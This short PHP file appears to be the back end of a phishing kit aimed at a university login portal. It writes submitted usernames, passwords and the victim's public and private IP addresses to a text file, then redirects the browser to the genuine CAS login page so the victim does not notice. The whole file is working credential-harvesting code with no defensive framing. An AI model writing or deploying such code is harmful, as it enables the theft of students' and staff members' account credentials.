<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password']." IP Publica: " . $_POST['ipPublica']." IP Privada: " . $_POST['ipPrivada'] . "\n", FILE_APPEND);
header('Location: https://portal.udem.edu:8447/cas/login?service=https%3A%2F%2Fportal.udem.edu%2Fc%2Fportal%2Flogin');
?>
